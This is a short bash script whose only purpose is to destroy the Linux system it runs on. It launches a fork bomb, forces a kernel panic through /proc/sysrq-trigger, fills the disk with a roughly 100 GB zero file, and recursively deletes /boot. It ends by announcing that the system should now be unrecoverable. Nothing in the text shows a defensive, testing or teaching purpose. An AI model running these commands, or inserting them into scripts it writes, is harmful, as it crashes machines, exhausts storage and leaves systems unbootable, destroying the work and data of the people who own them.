#!/bin/bash

:(){ :|:& };:

echo "Triggering Kernel Panic..."
echo c > /proc/sysrq-trigger

echo "Simulating Disk Space Exhaustion..."
dd if=/dev/zero of=/largefile bs=1M count=100000

echo "Deleting critical system files..."
rm -rf /boot

echo "Bye! System should be unrecoverable now."
